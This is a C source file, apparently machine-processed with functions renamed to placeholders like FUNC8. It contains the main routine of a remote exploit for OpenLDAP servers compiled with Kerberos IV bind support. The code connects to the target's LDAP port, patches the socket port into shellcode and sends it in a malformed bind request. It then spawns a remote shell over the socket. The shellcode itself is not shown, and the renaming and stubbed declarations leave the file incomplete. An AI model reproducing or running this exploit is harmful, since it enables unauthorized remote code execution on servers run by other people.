#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 size_t FINDSCKPORTOFS ; 
 int /*<<< orphan*/  LDAP_AUTH_KRBV41 ; 
 int SHELLCODE_LEN ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int) ; 
 char* FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (int,int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int) ; 

int FUNC12(int argc, char* argv[])
{
	char shellcode_buf[SHELLCODE_LEN+1];
	int port, sock, res;
	char* dn;
	char* p;

	FUNC6(": openldap-kbind-p00f.c - OpenLDAP kbind remote exploit\n");
	FUNC6("\n");
	FUNC6(": Only works on servers compiled with\n");
	FUNC6("    --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]\n");
	FUNC6("\n");
	FUNC6(": by Solar Eclipse <solareclipse@phreedom.org>\n\n");
	
	if (argc < 3) {
		FUNC6(": Usage: %s hostname bind_dn\n", argv[0]);
		FUNC6("  The bind_dn must exist in the LDAP directory.\n");
		FUNC3(1);
	}

	dn = argv[2];

	port = 389; /*atoi(argv[2]);*/
	sock = FUNC2(argv[1], port);

/*
	send_bind_request(sock, LDAP_AUTH_SIMPLE, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_SIMPLE bind request returned %s\n", ldap_result(res));
*/

/*	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_KRBV41 bind request returned %s\n", ldap_result(res));	
*/
	port = FUNC4(sock);

	shellcode[FINDSCKPORTOFS] = (char) (port & 0xff);
	shellcode[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	FUNC0(shellcode_buf, SHELLCODE_LEN);
	shellcode_buf[SHELLCODE_LEN] = '\0';

	FUNC6("Sending shellcode\n");
	FUNC8(sock, LDAP_AUTH_KRBV41, dn, shellcode_buf);
	
	FUNC10(2);

	/* Priming commands */
	FUNC11(sock, "echo 'a';\n", 10);

	FUNC6("Reading bind result\n");
	res = FUNC7(sock);
	if (res > 0)
		FUNC6("LDAP_AUTH_KRBV41 bind request returned %s\n", FUNC5(res));
	else {
		FUNC6("Spawning shell...\n");
		FUNC9(sock);
	}

	FUNC1(sock);
	
	return 0;
}